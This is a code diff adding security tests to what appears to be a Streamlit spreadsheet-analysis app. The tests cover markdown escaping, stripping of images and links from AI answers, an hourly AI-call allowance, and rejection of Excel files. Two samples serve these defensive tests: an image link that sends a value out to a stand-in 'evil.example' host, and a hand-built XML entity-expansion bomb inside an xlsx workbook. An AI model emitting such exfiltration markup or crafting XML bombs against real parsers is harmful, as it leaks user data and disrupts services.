@@ -207,6 +207,44 @@ for rule in ['[class*="st-key-glass_chart"] {', '[class*="st-key-glass_tile"]  {
     assert rule in style, f"style rule missing: {rule}"
 assert style.count("{") == style.count("}"), "every style rule is closed"
 
+# --- safety ---
+import io
+import zipfile
+
+import safety
+
+assert safety.md_safe("![x](http://evil.example/a.png)") == r"\!\[x\]\(http://evil.example/a.png\)", "file text cannot become a picture"
+assert safety.md_safe("$85k") == r"\$85k", "a dollar sign is not read as maths"
+cleaned = safety.clean_answer("Sales is **39.8%**. ![](https://evil.example/?pay=48000) See [this](https://x.example) <img src=x>")
+assert "evil" not in cleaned and "x.example" not in cleaned and "<img" not in cleaned, "answers lose pictures, links and HTML"
+assert "**39.8%**" in cleaned and "See this" in cleaned, "but keep their words and formatting"
+
+allowance = safety.Allowance(per_hour=2)
+assert allowance.take(now=0) and allowance.take(now=1) and not allowance.take(now=2), "the shared AI allowance runs out"
+assert allowance.take(now=3 * 3600), "and comes back the next hour"
+
+# a booby-trapped Excel file (an "XML bomb") is refused by defusedxml, not read
+import defusedxml
+
+normal = io.BytesIO()
+pd.DataFrame({"Team": ["A", "B"]}).to_excel(normal, index=False)
+trap = io.BytesIO()
+with zipfile.ZipFile(io.BytesIO(normal.getvalue())) as source, zipfile.ZipFile(trap, "w") as target:
+    for part in source.infolist():
+        data = source.read(part.filename)
+        if part.filename == "xl/workbook.xml":   # hide a self-repeating definition inside a real workbook
+            trick, text = '<!DOCTYPE x [<!ENTITY a "aaaa"><!ENTITY b "&a;&a;&a;">]>', data.decode()
+            data = (text.replace("?>", "?>" + trick, 1) if "?>" in text else trick + text).encode()
+        target.writestr(part, data)
+try:
+    cleaner.read_file(trap.getvalue(), "trap.xlsx")
+    reason = None
+except Exception as error:
+    reason = error
+    while reason.__cause__ or reason.__context__:
+        reason = reason.__cause__ or reason.__context__
+assert isinstance(reason, defusedxml.DefusedXmlException), "the XML trick is stopped by defusedxml"
+
 # --- the whole app, run without a browser: remembered results must stay correct ---
 from streamlit.testing.v1 import AppTest
 
